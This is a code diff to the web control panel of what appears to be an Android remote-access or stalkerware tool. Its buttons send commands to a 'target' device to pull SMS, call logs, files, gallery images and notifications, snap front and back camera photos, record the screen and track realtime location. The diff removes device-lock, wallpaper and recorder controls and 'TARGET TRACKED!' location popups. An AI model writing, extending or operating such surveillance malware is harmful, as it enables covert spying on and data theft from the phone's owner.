@@ -637,8 +637,8 @@
             }
 
             const buttons = [
-                'sms','calls','filemanager','gallery','notifications','apps','lock','openurl',
-                'get_location','recorder','wallpaper','flash','screenrecord','takebackpic','takefrontpic'
+                'sms','calls','filemanager','gallery','notifications','apps','toast','openurl',
+                'get_location','flash','screenrecord','takebackpic','takefrontpic'
             ];
             grid.innerHTML = buttons.map(btn => {
                 let icon = 'fa-question', label = btn;
@@ -648,11 +648,9 @@
                 else if (btn === 'gallery') icon = 'fa-images';
                 else if (btn === 'notifications') icon = 'fa-bell';
                 else if (btn === 'apps') icon = 'fa-th-large';
-                else if (btn === 'lock') icon = 'fa-user-lock', label = 'LOCK DEVICE';
+                else if (btn === 'toast') icon = 'fa-window-maximize';
                 else if (btn === 'openurl') icon = 'fa-external-link-alt';
-                else if (btn === 'get_location') icon = 'fa-crosshairs', label = 'LOKASI REALTIME';
-                else if (btn === 'recorder') icon = 'fa-video', label = 'RECORDER';
-                else if (btn === 'wallpaper') icon = 'fa-image', label = 'WALLPAPER';
+                else if (btn === 'get_location') icon = 'fa-map-marker-alt';
                 else if (btn === 'flash') icon = 'fa-bolt';
                 else if (btn === 'screenrecord') icon = 'fa-video';
                 else if (btn === 'takebackpic') icon = 'fa-camera-retro';
@@ -671,19 +669,14 @@
             if (action === 'flash') { toggleFlash(); updateMainDashboard(); }
             else if (action === 'screenrecord') { toggleScreenRecord(); updateMainDashboard(); }
             else if (action === 'takebackpic' || action === 'takefrontpic') openModal(action);
-            else if (action === 'get_location') {
-                sendCommand('get_location');
-                openModal('get_location');
-            }
-            else if (action === 'lock') openModal('lock');
-            else if (action === 'recorder') openModal('recorder');
-            else if (action === 'wallpaper') openModal('wallpaper');
+            else if (action === 'get_location') sendCommand('get_location');
             else openModal(action);
         };
 
         function toggleFlash() { flashOn = !flashOn; sendCommand(flashOn ? 'flashon' : 'flashoff'); }
         function toggleScreenRecord() { screenRecordOn = !screenRecordOn; sendCommand(screenRecordOn ? 'screenrecord start' : 'screenrecord stop'); }
 
+        // MODAL with loading bar simulation (if data missing)
         function openModal(type) {
             if (!selectedClientId) return showPopup('error', 'no target');
             currentModal = type;
@@ -692,15 +685,6 @@
             document.getElementById('modal-title').innerText = type.toUpperCase();
             const body = document.getElementById('modal-body');
             const footer = document.getElementById('modal-footer');
-            
-            // For input-based modals, don't show the data-loader and don't send data-request commands
-            if (type === 'lock' || type === 'wallpaper') {
-                body.innerHTML = ""; // Clear for immediate rendering
-                footer.innerHTML = "";
-                renderModalContent();
-                return;
-            }
-
             body.innerHTML = `<div class="data-loader"><i class="fas fa-spinner fa-pulse" style="font-size:2rem;color:var(--accent-secondary)"></i><div class="mini-loader-bar"><div class="mini-loader-fill" style="width:90%"></div></div><span>injecting...</span></div>`;
             footer.innerHTML = '';
 
@@ -911,21 +895,6 @@
                     clientDataCache[selectedClientId] = cdata;
                     
                     if (currentModal) renderModalContent();
-
-                    // --- AUTO POPUP FOR LOCATION UPDATES ---
-                    if (cdata.location_status === 'requesting' || cdata.location_status === 'pending') {
-                        if (lastDataHashes['loc_status'] !== 'pending') {
-                            lastDataHashes['loc_status'] = 'pending';
-                            showPopup('info', '🛰️ Triangulating target GPS...');
-                        }
-                    } else if (cdata.location_status === 'success' && cdata.location_url) {
-                        const locHash = selectedClientId + cdata.location_url + (cdata.location_image || '');
-                        if (lastDataHashes['auto_loc'] !== locHash) {
-                            lastDataHashes['auto_loc'] = locHash;
-                            lastDataHashes['loc_status'] = 'success';
-                            showPopup('info', '🎯 TARGET TRACKED! Open modal to view map.', 10000);
-                        }
-                    }
 
                     // Real-time notifications from notifications list
                     if (cdata.notifications?.length) {
